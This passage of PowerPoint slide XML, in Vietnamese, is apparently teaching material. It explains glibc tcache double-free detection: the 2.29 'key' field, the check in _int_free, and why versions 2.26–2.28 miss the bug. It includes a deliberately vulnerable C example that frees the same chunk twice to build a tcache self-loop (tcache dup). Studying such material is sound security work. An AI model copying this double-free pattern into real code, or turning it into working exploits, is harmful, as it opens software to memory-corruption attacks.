        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="5303520"/>
            <a:ext cx="3240024" cy="80467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Chỉ mã hoá con trỏ next (fd), không chặn double free</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4291584" y="4846320"/>
            <a:ext cx="3605784" cy="1371600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5333"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4474464" y="501091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THÔNG BÁO ABORT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4474464" y="5303520"/>
            <a:ext cx="3240024" cy="804672"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>double free or corruption (fasttop)</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> · </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>free(): double free detected in tcache 2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8125968" y="4846320"/>
            <a:ext cx="3605784" cy="1371600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5333"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8308848" y="501091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VÍ DỤ 5.5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8308848" y="5303520"/>
            <a:ext cx="3240024" cy="80467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Chunk 0x100 &gt; 0x80 nên thuộc tcache: kịch bản tcache dup trên 2.26–2.28</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Vì sao 2.26–2.28 lọt, 2.29 chặn</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5.4 · malloc.c:2904–2909 · 4201–4209 (glibc 2.29)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="5522976" cy="1828800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1554480"/>
            <a:ext cx="5157216" cy="1600200"/>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typedef struct tcache_entry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struct tcache_entry *next;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  /* This field exists to detect double frees.  */</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  struct tcache_perthread_struct *key;</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tcache_entry;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="3474720"/>
            <a:ext cx="5522976" cy="2743200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="3611880"/>
            <a:ext cx="5157216" cy="2514600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>tcache_entry *e = (tcache_entry *) chunk2mem (p);</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b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>if (__glibc_unlikely (e-&gt;key == tcache))</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tcache_entry *tmp;</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for (tmp = tcache-&gt;entries[tc_idx]; tmp;</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tmp = tmp-&gt;next)</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if (tmp == e)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>        malloc_printerr ("free(): double free"</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>                         " detected in tcache 2");</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  }</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6208776" y="1417320"/>
            <a:ext cx="5522976" cy="1463040"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="158191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GLIBC 2.27: KHÔNG CÓ DẤU VẾT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="1874520"/>
            <a:ext cx="5157216" cy="896112"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>tcache_put</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> chỉ ghi </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>e-&gt;next</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>; không trường nào đánh dấu chunk đã nằm trong tcache.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6208776" y="3108960"/>
            <a:ext cx="5522976" cy="1828800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="327355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GLIBC 2.29: TRƯỜNG KEY</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="3566160"/>
            <a:ext cx="5157216" cy="1261872"/>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accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>tcache_put</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> gán </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>e-&gt;key = tcache</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>tcache_get</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> xoá key về NULL khi cấp lại hợp lệ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>_int_free</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> thấy key khớp thì duyệt list, gặp lại e thì abort</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6208776" y="5166360"/>
            <a:ext cx="5522976" cy="1051560"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6957"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="533095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VÌ SAO PHẢI DUYỆT LIST</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="5623560"/>
            <a:ext cx="5157216" cy="48463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Comment trong source: key có thể trùng dữ liệu ngẫu nhiên, xác suất 1/2^size_t.</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Ví dụ minh họa: tcache dup trên glibc 2.26–2.28</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3 · 5.5 · BUFSIZE2 = 248 → CHUNK 0x100 → TCACHE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="6035040" cy="4800600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1524"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1554480"/>
            <a:ext cx="5669280" cy="457200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#define BUFSIZE1    512</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#define BUFSIZE2    ((BUFSIZE1 / 2) - 8)   /* 248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int main(int argc, char **argv)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char *i = (char *) malloc(BUFSIZE2);</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char *h = (char *) malloc(BUFSIZE2);</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free(i);    /* tcache[0x100] = i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free(h);    /* tcache[0x100]: h → i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char *j = (char *) malloc(BUFSIZE1);  /* 0x210, top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strncpy(j, argv[1], BUFSIZE1 - 1);</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b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  free(h);    /* không kiểm tra → h-&gt;next = h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free(j);    /* vào tcache bin khác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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="1417320"/>
            <a:ext cx="5010912" cy="1028700"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6903720" y="1581912"/>
            <a:ext cx="464515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BƯỚC 1 · free(i), free(h)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6903720" y="1874520"/>
            <a:ext cx="4645152" cy="46177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Hai chunk 0x100 vào tcache theo LIFO: danh sách h → i</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="2674620"/>
            <a:ext cx="5010912" cy="1028700"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6903720" y="2839212"/>
            <a:ext cx="464515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BƯỚC 2 · malloc(512) → j</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6903720" y="3131820"/>
            <a:ext cx="4645152" cy="46177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Cỡ 0x210 khác size class, cắt từ top chunk; tcache giữ nguyên</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="3931920"/>
            <a:ext cx="5010912" cy="1028700"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6903720" y="4096512"/>
            <a:ext cx="4645152"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BƯỚC 3 · free(h) LẦN 2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6903720" y="4389120"/>
            <a:ext cx="4645152" cy="461772"/>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Không kiểm tra trùng: h lên đầu bin, h-&gt;next = h (self-loop), i rụng khỏi list</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="5189220"/>
            <a:ext cx="5010912" cy="1028700"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6903720" y="5353812"/>
            <a:ext cx="464515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BƯỚC 4 · malloc(248) tiếp theo</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
